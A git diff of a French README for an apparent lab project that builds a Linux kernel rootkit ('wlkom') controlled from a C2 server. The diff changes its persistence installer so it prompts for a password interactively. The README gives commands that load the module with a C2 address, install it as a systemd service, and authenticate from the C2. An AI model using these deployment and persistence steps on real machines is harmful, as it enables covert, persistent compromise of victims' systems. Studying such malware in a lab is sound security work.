@@ -209,7 +209,7 @@ sudo insmod wlkom.ko password_hash=afd071e5 c2_ip=192.168.100.10 c2_port=4444
 soit installer la persistance, ce qui est le mode recommandé une fois la feature Persistence utilisée :
 
 ```bash
-sudo ./install_persistence.sh afd071e5 192.168.100.10 4444
+sudo ./install_persistence.sh 192.168.100.10 4444
 sudo systemctl restart wlkom.service
 ```
 
@@ -258,7 +258,7 @@ Mode persistant, recommandé après validation :
 
 ```bash
 # Sur la VM victime
-sudo ./install_persistence.sh <HASH_FNV1A> <IP_ATTAQUANT> 4444
+sudo ./install_persistence.sh <IP_ATTAQUANT> 4444
 sudo systemctl restart wlkom.service
 sudo systemctl --no-pager status wlkom.service
 ```
@@ -428,19 +428,21 @@ La persistance est assurée par un service systemd installé sur la VM victime. 
 
 Le script [rootkit/install_persistence.sh](rootkit/install_persistence.sh) automatise l'installation :
 
-1. copie `wlkom.ko` dans `/lib/modules/$(uname -r)/extra/` ;
-2. exécute `depmod -a` ;
-3. écrit `/etc/modprobe.d/wlkom.conf` avec `password_hash`, `c2_ip` et `c2_port` ;
-4. crée `/etc/systemd/system/wlkom.service` ;
-5. active le service avec `systemctl enable`.
+1. demande le mot de passe en interactif ;
+2. calcule son hash FNV-1a 32-bit ;
+3. copie `wlkom.ko` dans `/lib/modules/$(uname -r)/extra/` ;
+4. exécute `depmod -a` ;
+5. écrit `/etc/modprobe.d/wlkom.conf` avec `password_hash`, `c2_ip` et `c2_port` ;
+6. crée `/etc/systemd/system/wlkom.service` ;
+7. active le service avec `systemctl enable`.
 
-Exemple avec le mot de passe `test` (`password_hash=afd071e5`) :
+Exemple avec le mot de passe `test` :
 
 ```bash
 # Sur la VM victime
 cd /mnt/vmshare/rootkit
 make
-sudo ./install_persistence.sh afd071e5 192.168.100.10 4444
+sudo ./install_persistence.sh 192.168.100.10 4444
 sudo systemctl start wlkom.service
 sudo systemctl status wlkom.service
 ```
@@ -474,7 +476,7 @@ sudo depmod -a
 
 ### Password (1pt) — DONE
 
-Le module ne stocke pas le mot de passe brut. Il reçoit seulement un hash FNV-1a 32-bit via le paramètre kernel `password_hash`. Avec la persistance activée, ce paramètre est écrit dans `/etc/modprobe.d/wlkom.conf` par `install_persistence.sh`, puis relu automatiquement par `modprobe wlkom` quand `wlkom.service` démarre.
+Le module ne stocke pas le mot de passe brut. Il reçoit seulement un hash FNV-1a 32-bit via le paramètre kernel `password_hash`. Avec la persistance activée, `install_persistence.sh` demande le mot de passe en interactif, calcule le hash, écrit ce hash dans `/etc/modprobe.d/wlkom.conf`, puis `modprobe wlkom` le relit automatiquement quand `wlkom.service` démarre.
 
 Le module refuse de se charger si `password_hash` est absent ou vide (`-EINVAL`).
 
@@ -498,7 +500,8 @@ Mode persistant, recommandé après installation de la persistence :
 
 # Sur la victime
 cd /mnt/vmshare/rootkit
-sudo ./install_persistence.sh afd071e5 192.168.100.10 4444
+sudo ./install_persistence.sh 192.168.100.10 4444
+# entrer test quand le script demande WLKOM password
 sudo systemctl restart wlkom.service
 sudo dmesg | tail
 ```
@@ -508,12 +511,13 @@ Pour tester un mauvais mot de passe en mode persistant, installer volontairement
 ```bash
 # Sur la victime
 cd /mnt/vmshare/rootkit
-sudo ./install_persistence.sh 00000000 192.168.100.10 4444
+sudo ./install_persistence.sh 192.168.100.10 4444
+# entrer wrongpass quand le script demande WLKOM password
 sudo systemctl restart wlkom.service
 sudo dmesg | tail
 ```
 
-Le C2 lancé avec `./c2 4444 test` enverra `AUTH afd071e5`, mais le module attendra `00000000`, donc les logs doivent contenir `wlkom: C2 authentication failed`.
+Le C2 lancé avec `./c2 4444 test` enverra le hash de `test`, mais le module attendra le hash de `wrongpass`, donc les logs doivent contenir `wlkom: C2 authentication failed`.
 
 Mode manuel sans persistance, utile seulement pour un test rapide :
 
